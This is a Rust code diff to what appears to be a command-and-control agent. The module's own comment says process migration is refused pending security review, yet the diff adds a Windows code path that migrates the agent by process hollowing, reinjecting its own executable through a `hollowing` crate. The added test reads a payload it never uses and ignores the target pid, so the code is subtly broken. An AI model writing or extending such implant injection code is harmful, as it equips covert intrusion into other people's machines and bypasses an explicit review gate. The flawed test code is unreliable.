@@ -12,6 +12,8 @@ use anyhow::Result;
 use serde::{Deserialize, Serialize};
 use sysinfo::System;
 
+// Windows-only process hollowing now lives in the shared `hollowing` crate.
+
 /// A lightweight, serializable view over a process suitable for shipping back
 /// to the operator console.
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -45,12 +47,20 @@ pub fn list_processes() -> Vec<ProcessInfo> {
 /// `ptrace(PTRACE_ATTACH)` + `process_vm_writev`) and carries enough
 /// stability and security risk that we expose the API surface but refuse to
 /// perform the operation until the implementation has had a thorough review.
+#[cfg(not(windows))]
 pub fn migrate_to_process(target_pid: u32) -> Result<()> {
     tracing::warn!(
         target_pid,
         "MigrateAgent invoked but migration is not yet implemented; returning a controlled error."
     );
     anyhow::bail!("Process migration is not implemented in this release (target pid {target_pid}).")
+}
+
+#[cfg(windows)]
+pub fn migrate_to_process(_target_pid: u32) -> Result<()> {
+    tracing::info!("Attempting to migrate agent via process hollowing.");
+    let payload = std::fs::read(std::env::current_exe()?)?;
+    hollowing::hollow_and_execute(&payload)
 }
 
 #[cfg(test)]
@@ -69,8 +79,20 @@ mod tests {
     }
 
     #[test]
+    #[cfg(not(windows))]
     fn migrate_returns_controlled_error() {
         let err = migrate_to_process(1).unwrap_err();
         assert!(err.to_string().contains("not implemented"));
+    }
+
+    #[test]
+    #[ignore]
+    #[cfg(windows)]
+    fn test_hollowing() {
+        // This test is ignored because it's invasive, but can be run manually.
+        // It requires a dummy executable to be present at `target/debug/dummy.exe`.
+        // You can create one with `rustc -o target/debug/dummy.exe --crate-type bin tests/dummy_process.rs`
+        let payload = std::fs::read("target/debug/dummy.exe").expect("dummy.exe not found");
+        assert!(migrate_to_process(0).is_ok());
     }
 }
